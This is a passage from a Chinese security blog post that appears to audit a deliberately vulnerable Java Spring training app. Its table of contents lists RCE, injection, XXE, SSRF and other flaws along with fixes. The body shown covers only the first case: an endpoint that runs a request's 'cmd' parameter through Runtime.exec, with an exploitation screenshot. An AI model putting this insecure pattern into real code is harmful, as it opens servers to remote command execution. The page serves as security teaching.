href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">上述存在XXE漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">统一漏洞利用payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">统一修复代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.路由&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">八、命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.路由&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span class="toc-text">2.路由&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">九、Cookie伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.路由&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.路由&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.路由&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.路由&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span class="toc-text">5.路由&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.路由&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">十、CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">（1）限制origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">（2）WebMvcConfigurer设置Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（3）spring security设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（4）自定义filter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（5）CorsFilter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">（6）origin检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">十一、目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.路由&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">十二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.路由&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">十三、SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.路由&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.路由&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">十四、Deserialize反序列化</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">五、CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.路由&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRF防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">六、XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.路由&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.路由&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSS攻击防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">七、XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">上述存在XXE漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">统一漏洞利用payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">统一修复代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.路由&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">八、命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.路由&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span class="toc-text">2.路由&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">九、Cookie伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.路由&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.路由&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.路由&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.路由&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span class="toc-text">5.路由&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.路由&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">十、CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">（1）限制origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">（2）WebMvcConfigurer设置Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（3）spring security设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（4）自定义filter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（5）CorsFilter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">（6）origin检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">十一、目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.路由&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">十二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.路由&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">十三、SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.路由&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.路由&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">十四、Deserialize反序列化</span></a></li></ol></div></p>
<h2 id="一、RCE"><a href="#一、RCE" class="headerlink" title="一、RCE"></a>一、RCE</h2><h3 id="1-路由-x2F-rce-x2F-runtime-x2F-exec"><a href="#1-路由-x2F-rce-x2F-runtime-x2F-exec" class="headerlink" title="1.路由&#x2F;rce&#x2F;runtime&#x2F;exec"></a>1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</h3><p>漏洞代码：</p>
<pre><code class="java">@GetMapping(&quot;/runtime/exec&quot;)
    public String CommandExec(String cmd) &#123;
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try &#123;
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) &#123;
                sb.append(tmpStr);
            &#125;

            if (p.waitFor() != 0) &#123;
                if (p.exitValue() == 1)
                    return &quot;Command exec failed!!&quot;;
            &#125;

            inBr.close();
            in.close();
        &#125; catch (Exception e) &#123;
            return e.toString();
        &#125;
        return sb.toString();
    &#125;
</code></pre>
<p>该代码通过GET请求接收一个cmd参数，接收到的字符串用exec命令执行，利用方式如下：</p>
<img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927145407277.png" alt="image-20240927145407277" style="zoom:200%;" />



